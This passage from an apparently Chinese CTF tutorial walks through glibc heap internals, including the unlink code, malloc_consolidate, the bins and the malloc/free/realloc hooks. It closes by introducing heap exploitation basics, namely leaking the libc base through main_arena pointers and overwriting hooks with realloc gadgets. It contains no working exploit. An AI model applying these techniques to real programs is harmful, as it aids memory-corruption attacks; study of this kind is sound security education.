<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><h5 id="I-unlink-under-glibc2-28-involved"><a href="#I-unlink-under-glibc2-28-involved" class="headerlink" title="I.unlink under glibc2.28(involved)"></a>I.unlink under glibc2.28(involved)</h5><p>由于从各种bins中取出一个chunk的操作十分频繁，若是使用函数实现则会造成较大的开销，故unlink操作被单独实现为一个宏，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;                                      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;                                      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;                                      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;                                  \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;                                  \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;              \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \</span></span><br><span class="line"><span class="meta">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">          malloc_printerr (check_action,                      \</span></span><br><span class="line"><span class="meta">                   <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">                   P, AV);                          \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;                      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;                                  \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \</span></span><br><span class="line"><span class="meta">                  &#125;                                  \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;                                  \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span></span><br><span class="line"><span class="meta">              &#125;                                      \</span></span><br><span class="line"><span class="meta">          &#125;                                      \</span></span><br><span class="line"><span class="meta">      &#125;                                          \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<p>大致的一个流程如下：</p>
<ul>
<li>P为要被unlink的chunk，FD、BK则是chunk：P-&gt;fd与P-&gt;bk</li>
<li>检查FD-&gt;bk与BK-&gt;fd是否都指向P，若否，则输出错误信息</li>
<li>将FD-&gt;bk指向BK，将BK-&gt;fd指向FD，<strong>这个时候这个chunk便已经不在该bin的双向循环链表中了</strong></li>
<li><strong>若是chunk size位于small bin的范围内，则unlink结束，否则标志着此时chunk的fd_nextsize与bk_nextsize字段是启用的，需要接着将之从nextsize链表中unlink</strong>（large bin特有）</li>
<li>检查P-&gt;fd_nextsize-&gt;bk_size与P-&gt;bk_nextsize-&gt;fd_nextsize是否指向P，和前面的过程类似这里便不再赘叙</li>
<li><strong>若FD-&gt;fd_nextsize不为NULL，则将P从其所处nextsize链表中unlink</strong></li>
<li><strong>若FD-&gt;fd_nextsize为NULL时</strong>，若P-&gt;fd_nextsize指向自身，则将FD-&gt;fd_nextsize与FD-&gt;bk_nextsize都指向FD（代表该chunk不属于任何一个nextsize链表？），<strong>否则使用FD替换掉P所在的nextsize链表中的位置</strong></li>
</ul>
<p>大致过程如下图所示</p>
<p><img src="https://i.loli.net/2020/12/23/AVsn1tB9hydocYe.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/MfhiGYa97XLRtHK.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/gkAXzI2M8UviO9C.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/TR23CkfSEOLYtgh.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/FGMlVisw69xtThJ.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/PNIcnpb1YJovmai.png" alt="image.png"></p>
<h2 id="II-unlink-over-glibc-2-29-involved"><a href="#II-unlink-over-glibc-2-29-involved" class="headerlink" title="II.unlink over glibc 2.29(involved)"></a>II.unlink over glibc 2.29(involved)</h2><p>自 glibc 2.29 起 unlink 被实现为一个函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>用以临时存放堆块的 bin，在<strong>size 大于 fastbin 范围、tcache 链表已满</strong>（如果有 tcache ）时一个 chunk 在 free 之后则会先被放入 unsorted bin 中</p>
<p>若被放入 unsorted bin 中的 chunk 与原有 unsorted chunk <strong>物理相邻则会合并</strong>成一个大 chunk</p>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>存放size较小的空闲chunk的bin</p>
<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>存放size较大的空闲chunk的bin</p>
<h1 id="0x03-内存分配相关函数"><a href="#0x03-内存分配相关函数" class="headerlink" title="0x03.内存分配相关函数"></a>0x03.内存分配相关函数</h1><h2 id="一、malloc"><a href="#一、malloc" class="headerlink" title="一、malloc"></a>一、malloc</h2><p>malloc() 函数用于分配 chunk，首先从 tcahe 到 fastbin 再到 bins 中寻找可用 chunk，当现有的常规空闲 chunk <strong>不直接满足要求时</strong>会从 top chunk 中进行切割或是尝试合并可以合并的相邻空闲 chunk，万不得已时才会进行系统调用</p>
<h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h3><p>位于 libc 中的函数指针变量，通常为 NULL，不为 NULL 时 malloc() 函数会优先调用该函数指针</p>
<h2 id="二、free"><a href="#二、free" class="headerlink" title="二、free"></a>二、free</h2><p>free() 函数用于将对应的空闲 chunk 放入相应的 bin 中，在一定情况下还会合并相邻空闲 chunk</p>
<h3 id="free-hook"><a href="#free-hook" class="headerlink" title="__free_hook"></a>__free_hook</h3><p>位于 libc 中的函数指针变量，通常 为NULL ，不为NULL时 free() 函数会优先调用该函数指针，<strong>传入的参数为要free 的 chunk 的 fd 域的地址</strong></p>
<h2 id="三、realloc"><a href="#三、realloc" class="headerlink" title="三、realloc"></a>三、realloc</h2><p>用以扩展 chunk，相邻 chunk 闲置且空间充足则会进行合并，<strong>否则会重新分配 chunk</strong></p>
<p>即<strong>通过 realloc 我们可以完成对一个 chunk 的 free</strong>，也就是说在特殊情况下 realloc 是可以当作 free 使用的，其中，在<strong>size 为 0 的情况下，realloc 函数会调用 free 释放该 chunk</strong></p>
<h3 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook"></a>__realloc_hook</h3><p>位于 libc 中的函数指针变量，通常为 NULL ，不为 NULL 时 realloc() 函数会优先调用该函数指针</p>
<p>由于 __realloc_hook 与 __malloc_hook 相邻，因此在 heap exploit 中有着这样一种手法便是同时修改这两个 hook，通过 __libc_realloc 中的一些 gadget 调整堆栈以满足一些特定的要求</p>
<h2 id="四、calloc"><a href="#四、calloc" class="headerlink" title="四、calloc"></a>四、calloc</h2><p>在最近的 CTF 比赛中开始变得热门的一个函数，该函数在分配时<strong>会清空 chunk 上的内容</strong>，这使得我们无法通过以往的重复存取后通过 chunk 上残留的脏数据的方式泄露信息（例如通过 bins 数组遗留的脏数据泄露 libc 基址等），<strong>同时该函数不从 tcache 中拿 chunk</strong>，但是 <code>free()</code> 函数默认还是会先往 tcache 里放的，这无疑增加了我们利用的难度</p>
<h2 id="五、malloc-consolidate"><a href="#五、malloc-consolidate" class="headerlink" title="五、malloc_consolidate"></a>五、malloc_consolidate</h2><p>该函数用以<strong>清空fastbins中chunk、合并相邻空闲chunk</strong>，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, size);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">          size += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, size);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先会先检查<strong>global_max_fast</strong>：</p>
<ul>
<li><strong>若不为0则会设置该arena的FASTCHUNKS_BIT标志位，意味着接下来该函数会清空该arena的fastbin中的chunks</strong></li>
<li><strong>若为0则意味着该线程的arena未进行初始化</strong>，此时便会<strong>调用malloc_init_state</strong>()<strong>函数初始化该arena，</strong>随后使用check_malloc_state()宏进行检查后<strong>该函数便结束了</strong>，在非DEBUG模式下（未定义宏MALLOC_DEBUG）该宏为空</li>
</ul>
<p>接在已经初始化的情况下接下来会<strong>分别获取指向arena中fastbinsY数组首尾元素的指针，用以对fastbinsY数组进行遍历，</strong>这个遍历由两层循环嵌套而成：</p>
<h3 id="外层循环：遍历fastbinsY数组元素"><a href="#外层循环：遍历fastbinsY数组元素" class="headerlink" title="外层循环：遍历fastbinsY数组元素"></a>外层循环：遍历fastbinsY数组元素</h3><p>我们单独将这个循环嵌套拿出来看为如下形式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="comment">// inner loop there</span></span><br><span class="line">        &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br></pre></td></tr></table></figure>

<p>我们不难看出外层循环的作用便是<strong>逐个取出fastbinsY数组中元素，随后交由内层循环进行下一步的处理</strong></p>
<p>在这里使用了一个宏<code>atomic_exchange_acq()</code>，用途是<strong>通过原子读操作设置新值，返回旧值</strong>，前面已解析过类似宏，这里便不再赘叙</p>
<p>虽然前文我们有讲到fastbinsY数组的下标包括7及往后都是用不到的，但是在这里仍会尝试对齐进行遍历</p>
<h3 id="内层循环：遍历fastbin-链表、合并空闲chunk"><a href="#内层循环：遍历fastbin-链表、合并空闲chunk" class="headerlink" title="内层循环：遍历fastbin 链表、合并空闲chunk"></a>内层循环：遍历fastbin 链表、合并空闲chunk</h3><p>在内层循环中会从我们从外层循环中所取得的fastbins链表的头结点开始进行遍历，并进行空闲chunk的合并以减少内存碎片</p>
<p>若<strong>获取到的头结点为NULL则会直接跳过该层循环</strong>，否则进入下面的步骤</p>
<p>在这里有一个宏<code>check_inuse_chunk()</code>，该宏在非DEBUG模式下（宏MALLOC_DEBUG undefined）也为空</p>
<p>首先会获取该节点chunk的size，在这里<strong>获取到的size清除了PREV_INUSE标志位与NON_MAIN_ARENA标志位</strong>，这是为了在后面的合并过程中能够准确地获取到高地址相邻chunk的位置</p>
<blockquote>
<p>说起来网上很多关于malloc_consolidate()的博客都有讲到所谓「前向合并」和「后向合并」，但是哪边是前哪边是后笔者暂且蒙在古里（注释里笔者也没看到forward&#x2F;backward…</p>
<p>那么下文我们按照对其称呼的惯例做出如下约定：将<strong>向高地址的合并称为「前向合并」，向低地址的合并称为「后向合并」</strong></p>
</blockquote>
<h4 id="①后向合并：使用unlink取出相邻低地址chunk（若已free）"><a href="#①后向合并：使用unlink取出相邻低地址chunk（若已free）" class="headerlink" title="①后向合并：使用unlink取出相邻低地址chunk（若已free）"></a>①后向合并：使用unlink取出相邻低地址chunk（若已free）</h4><p>首先会<strong>检查该chunk的PREV_IN_USE标志位，若不为1则说明低地址相邻chunk必为存放在bins数组中的free chunk</strong>，这是因为<strong>当一个chunk被使用中&#x2F;被放入fastbin中，其相邻高地址的chunk的PREV_INUSE标志位都不会被清除，只有放入bins中才会清除该标志位</strong>，相关机制我们会在后文的_int_free()函数中详细进行分析</p>
<p>这种情况下会<strong>在前面的size变量中加上原chunk的prevsize域的值，将chunk指针移动至指向该空闲chunk，如下图所示</strong></p>
<p><img src="https://i.loli.net/2021/01/23/GqBQHD12NtAESkT.png" alt="image.png"></p>
<p><strong>最后使用unlink宏从bins中取出该chunk</strong>，后向合并的过程就完成了</p>
<p><img src="https://i.loli.net/2021/01/23/pKVSclCIunvofOm.png" alt="image.png"></p>
<p>需要注意的是在这里是<strong>使用原chunk的prevsize域计算该空闲chunk的大小，而并非直接使用低地址空闲chunk的size域</strong></p>
<h4 id="②前向合并：若为top-chunk则合并入top-chunk中，否则会尝试合并后插入unsorted-bin中"><a href="#②前向合并：若为top-chunk则合并入top-chunk中，否则会尝试合并后插入unsorted-bin中" class="headerlink" title="②前向合并：若为top chunk则合并入top chunk中，否则会尝试合并后插入unsorted_bin中"></a>②前向合并：若为top chunk则合并入top chunk中，否则会尝试合并后插入unsorted_bin中</h4><h5 id="1）nextchunk为top-chunk"><a href="#1）nextchunk为top-chunk" class="headerlink" title="1）nextchunk为top chunk"></a>1）nextchunk为top chunk</h5><p>首先会检查nextchunk是否为top chunk，若是则流程会简便得多：<strong>将该chunk的size加上nextchunk的size，设置PREV_INUSE标志位，将arena的top chunk设置为该chunk后便进入下一步</strong></p>
<p><img src="https://i.loli.net/2021/01/23/QF5vhAYbGeqf4C9.png" alt="image.png"></p>
<h5 id="5）nextchunk不为top-chunk"><a href="#5）nextchunk不为top-chunk" class="headerlink" title="5）nextchunk不为top chunk"></a>5）nextchunk不为top chunk</h5><p>若nextchunk不为top chunk，则<strong>首先会检查nextchunk的物理相邻高地址chunk的PREV_INUSE标志位</strong></p>
<ul>
<li><strong>若不为0则会清除nextchunk的PREV_INSUE位</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/01/23/YVaFRKonG4WBuXM.png" alt="image.png"></p>
<ul>
<li><strong>若为0则使用unlink将nextchunk从bins中取出</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/01/23/LEBAKhTbSMlCcVr.png" alt="image.png"></p>
<p>接下来会<strong>将该chunk放入unsorted bin中，需要注意的是在这里使用的是头插法使其成为unsorted bin的头结点</strong></p>
<p><img src="https://i.loli.net/2021/01/23/BNJIPrGL9eTvX8U.png" alt="image.png"></p>
<p>接下来会检查chunk最终的大小，<strong>若是size不处于smallbins范围内则会设置其fd_nextsize与bk_nextsize为NULL</strong></p>
<p>最后，<strong>设置该chunk的PREV_INUSE位为1</strong>，设置<strong>当前情况下的物理相邻chunk的prevsize域为该chunk的size</strong></p>
<p><img src="https://i.loli.net/2021/01/23/5b7qYPjO1AmXkyF.png" alt="image.png"></p>
<h4 id="③检查链表中的下一个chunk，不为NULL则继续新一轮循环"><a href="#③检查链表中的下一个chunk，不为NULL则继续新一轮循环" class="headerlink" title="③检查链表中的下一个chunk，不为NULL则继续新一轮循环"></a>③检查链表中的下一个chunk，不为NULL则继续新一轮循环</h4><p>虽然chunk指针可能在合并中被修改，但是我们在前面已经保存了其fd，若不为NULL则进行下一轮循环，故可以继续遍历链表的进程</p>
<h1 id="0x04-基础的利用方式"><a href="#0x04-基础的利用方式" class="headerlink" title="0x04.基础的利用方式"></a>0x04.基础的利用方式</h1><h2 id="一、地址泄露"><a href="#一、地址泄露" class="headerlink" title="一、地址泄露"></a>一、地址泄露</h2><p>与 ret2libc 相同，CTF的堆题中往往不会直接给我们后门函数，同时地址随机化保护往往也都是开着的（准确地说，几乎所有的堆题都是<strong>保  护  全  开</strong>），故我们仍然需要利用 libc 中的 gadget 以获得 flag</p>
<h3 id="bins-libc-基址"><a href="#bins-libc-基址" class="headerlink" title="bins - libc 基址"></a>bins - libc 基址</h3><p>（除 fastbin 与 tcache 以外）bins 与空闲 chunk 间构成双向链表结构，利用这个特性我们便可以泄漏出main_arena 的地址，进而泄漏出 libc 的基址</p>
<p>gdb 调试可以方便我们知道 chunk 上所记载的与 main_arena 间的偏移</p>
